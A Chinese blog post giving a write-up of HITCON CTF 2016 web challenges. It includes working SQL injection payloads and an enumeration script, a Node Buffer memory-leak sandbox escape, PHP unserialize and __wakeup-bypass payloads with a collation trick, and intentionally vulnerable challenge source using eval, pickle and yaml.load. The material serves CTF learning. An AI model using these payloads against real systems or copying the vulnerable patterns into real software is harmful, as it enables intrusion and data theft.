---
title: hitcon2016 writeup
date: 2016-10-10 13:48:38
tags:
- Blogs
- ctf
categories:
- Blogs
---

当大家在为祖国母亲庆生的时候，我在打lctf，当大家正为休息而搁置的事情忙碌的时候，我在打hitcon，不过虽然有点儿辛苦，但是一场国内的优质比赛加上顶级的国外比赛，还是让我打开了新世界的大门，orange菊苣大法叼...

![](/img/hitcon2016/paiming.png)
![](/img/hitcon2016/mingci.png)
![](/img/hitcon2016/timu.png)


<!--more-->


# web #

## are you rich 1&2 ##


说实话这题做的也是迷迷糊糊的，反正就是莫名其妙就done了

简单来说就是get address可以得到一个bitcoin的address，但是里面并没有钱。

但是购买flag是需要钱的。

翻了翻发现是存在注入，但是当时也没想着要注入，是找个了世界上最大的bitcoin账户地址，然后通过联合查询绕过对于前缀地址的检查，然后就done了，还是一done双题...

payload:
```
address=18AfZLTCK1ZByGLjbthXLKsZfcqy9N8Kjf' union select '1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF' limit 1,1#&flag_id=flag1&submit=

```

get

```
hitcon{4r3_y0u_r1ch?ju57_buy_7h3_fl4g!!}

Well done!
Aww yeah, you successfully read this important message. Thank you for buying flag.
Here's your flag: Flag2 is: hitcon{u51n6_07h3r_6uy5_b17c0n_70_byp455_ch3ck1n6_15_fun!!}

```

后来发现这里其实是注入

[https://www.eugenekolo.com/blog/hitcon-ctf-2016-writeups/](https://www.eugenekolo.com/blog/hitcon-ctf-2016-writeups/)

```
import requests

URL = 'http://52.197.140.254/are_you_rich/verify.php'

for i in range(0, 100):  
    address = r"d' AND 1=2 UNION ALL SELECT table_name from information_schema.tables LIMIT {},1 #".format(str(i))
    print(address)
    data = {'address': address,
            'flag_id': 'flag2',
             'submit': 1}

    r = requests.post(URL, data=data)

    if 'not have enough' not in r.text:
        print(r.text)
```


```
d' AND 1=2 UNION ALL SELECT flag from flag1 #  
```

## leaking ##

上来就是代码审计，定晶一看发现是node代码，很炸

```
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {VM} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function (req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function () {
    console.log("listening on port 3000!");

```

其核心逻辑简单来说就是把传入的代码放到了vm虚拟机中，有最基础的node环境。

这里就有了问题，既然是虚拟机，怎么访问虚拟机外的config.js或者是变量呢？

直到找到了这篇文章

[https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)

低版本的node可以使用buffer()来查看内存，只要调用过的变量，都会存在内存中，那么我们可以构造paylaod读取内存

payload:
```
 http://52.198.115.130:3000/?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(100)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
flag: hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}
```

有个小tips是数组可以绕过长度的限制


## secret post 1&2 ##

打开看又是代码审计，这次是flask

```
from flask import Flask
import config

# init app
app = Flask(__name__)
app.secret_key = config.flag1
accept_datatype = ['json', 'yaml']

from flask import Response
from flask import request, session
from flask import redirect, url_for, safe_join, abort
from flask import render_template_string

# load utils
def load_eval(data):
    return eval(data)

def load_pickle(data):
    import pickle
    return pickle.loads(data)

def load_json(data):
    import json
    return json.loads(data)

def load_yaml(data):
    import yaml
    return yaml.load(data)

# dump utils
def dump_eval(data):
    return repr(data)

def dump_pickle(data):
    import pickle
    return pickle.dumps(data)

def dump_json(data):
    import json
    return json.dumps(data)

def dump_yaml(data):
    import yaml
    return yaml.dump(data)


def render_template(filename, **args):
    with open(safe_join(app.template_folder, filename)) as f:
        template = f.read()
    name = session.get('name', 'anonymous')[:10]
    return render_template_string(template.format(name=name), **args)

def load_posts():
    handlers = {
        # disabled insecure data type
        #"eval": load_eval,
        #"pickle": load_pickle,

        "json": load_json,
        "yaml": load_yaml
    }

    datatype = session.get("post_type", config.default_datatype)
    data = session.get("post_data", config.default_data)

    if datatype not in handlers: abort(403)
    return handlers[datatype](data)

def store_posts(posts, datatype):
    handlers = {
        "eval": dump_eval,
        "pickle": dump_pickle,

        "json": dump_json,
        "yaml": dump_yaml
    }
    if datatype not in handlers: abort(403)
    data = handlers[datatype](posts)

    session["post_type"] = datatype
    session["post_data"] = data


@app.route('/')
def index():
    posts = load_posts()
    return render_template('index.html', posts = posts, accept_datatype = accept_datatype)

@app.route('/post', methods=['POST'])
def add_post():
    posts = load_posts()

    title = request.form.get('title', 'empty')
    content = request.form.get('content', 'empty')
    datatype = request.form.get('datatype', 'json')
    if datatype not in accept_datatype: abort(403)
    name = request.form.get('author', 'anonymous')[:10]

    from datetime import datetime
    posts.append({
        'title': title,
        'author': name,
        'content': content,
        'date': datetime.now().strftime("%B %d, %Y %X")
    })
    session["name"] = name
    store_posts(posts, datatype)
    return redirect(url_for('index'))

@app.route('/source')
def get_source():
    with open(__file__, "r") as f:
        resp = f.read()
    return Response(resp, mimetype="text/plain")

```

因为题目不是我做的，所以这里，先放上别人的wp，等研究明白后再补齐wp

[https://www.eugenekolo.com/blog/hitcon-ctf-2016-writeups/](https://www.eugenekolo.com/blog/hitcon-ctf-2016-writeups/)


## baby trick ##

终于到了php的代码审计，先看看代码

```
 <?php

include "config.php";

class HITCON{
    private $method;
    private $args;
    private $conn;

    public function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;

        $this->__conn();
    }

    function show() {
        list($username) = func_get_args();
        $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username);

        $obj = $this->__query($sql);
        var_dump($sql);
        var_dump($obj);
        if ( $obj != false  ) {
            $this->__die( sprintf("%s is %s", $obj->username, $obj->role) );
        } else {
            $this->__die("Nobody Nobody But You!");
        }
        
    }

    function login() {
        global $FLAG;

        list($username, $password) = func_get_args();
        $username = strtolower(trim(mysql_escape_string($username)));
        $password = strtolower(trim(mysql_escape_string($password)));

        $sql = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, $password);
        var_dump($sql);

        if ( $username == 'orange' || stripos($sql, 'orange') != false ) {
            $this->__die("Orange is so shy. He do not want to see you.");
        }

        $obj = $this->__query($sql);
        if ( $obj != false && $obj->role == 'admin'  ) {
            $this->__die("Hi, Orange! Here is your flag: " . $FLAG);
        } else {
            $this->__die("Admin only!");
        }
    }

    function source() {
        highlight_file(__FILE__);
    }

    function __conn() {
        global $db_host, $db_name, $db_user, $db_pass, $DEBUG;

        if (!$this->conn)
            $this->conn = mysql_connect($db_host, $db_user, $db_pass);

        mysql_select_db($db_name, $this->conn);

        if ($DEBUG) {
            $sql = "CREATE TABLE IF NOT EXISTS users ( 
                        username VARCHAR(64), 
                        password VARCHAR(64), 
                        role VARCHAR(64)
                    ) CHARACTER SET utf8";
            $this->__query($sql, $back=false);

            $sql = "INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')";
            $this->__query($sql, $back=false);
        } 

        mysql_query("SET names utf8");
        mysql_query("SET sql_mode = 'strict_all_tables'");
    }

    function __query($sql, $back=true) {
        $result = @mysql_query($sql);
        if ($back) {
            return @mysql_fetch_object($result);
        }
    }

    function __die($msg) {
        $this->__close();

        header("Content-Type: application/json");
        die( json_encode( array("msg"=> $msg) ) );
    }

    function __close() {
        mysql_close($this->conn);
    }

    function __destruct() {
        $this->__conn();
        if (in_array($this->method, array("show", "login", "source"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        } else {
            $this->__die("What do you do?");
        }

        $this->__close();
    }

    function __wakeup() {
        foreach($this->args as $k => $v) {
            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));
        }
    }
}

if(isset($_GET["data"])) {
    @unserialize($_GET["data"]);    
} else {
    $hitcon = new HITCON("source", array());
} 
```

先分析逻辑

data读入->反序列化->__wakeup执行（一次过滤）->__destruct执行（调用对应的函数）->show(读入username查询)

这样看应该很明显了，show逻辑明显存在注入，__wakeup绕过就不多说了，lctf刚刚才出过的cve。

那么构造payload

```

http://52.198.42.246?data=O%3A6%3A%22HITCON%22%3A5%3A%7Bs%3A14%3A%22%00HITCON%00method%22%3Bs%3A4%3A%22show%22%3Bs%3A12%3A%22%00HITCON%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A81%3A%22orange%27+union+select+password%2C1%2C1+from+users+where+username+%3D+%27orange%27+limit+1%2C1%23%22%3B%7Ds%3A12%3A%22%00HITCON%00conn%22%3Bi%3A0%3B%7D

{"msg":"babytrick1234 is 1"}

```

这里我们得到了orange账户的密码

然后就到了第二步

```

    if ( $username == 'orange' || stripos($sql, 'orange') != false ) {
        $this->__die("Orange is so shy. He do not want to see you.");
    }

```

这里开始一直没有想法，但是后来看到了这个

```
MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写,      Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。
```

所以构造payload
```

http://52.198.42.246?data=O%3A6%3A%22HITCON%22%3A3%3A%7Bs%3A14%3A%22%00HITCON%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00HITCON%00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22%C3%96range%22%3Bi%3A1%3Bs%3A13%3A%22babytrick1234%22%3B%7Ds%3A12%3A%22%00HITCON%00conn%22%3Bi%3A0%3B%7D


{"msg":"Hi, Orange! Here is your flag: hitcon{php 4nd mysq1 are s0 mag1c, isn't it?}"}

```

很强势


## %%% ##

题目很简单，但是在实际日站的时候，有很多时候都能用得到

打开发现是自签名的https，那么理所当然看了下证书来源

发现了特殊的域名

```
very-secret-area-for-ctf.orange.tw
```

但是外网并不能访问，那么我们猜测这是使用了内网的dns服务器

那么我们就通过修改host的方式来使用内网的dns

构造请求

```

GET /index.php HTTP/1.1
Host: very-secret-area-for-ctf.orange.tw
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1




HTTP/1.1 200 OK
Date: Sun, 09 Oct 2016 16:04:41 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.19
Content-Length: 64
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<pre>Nice, here is your flag: hitcon{hihihi, how 4re y0u today?}


```

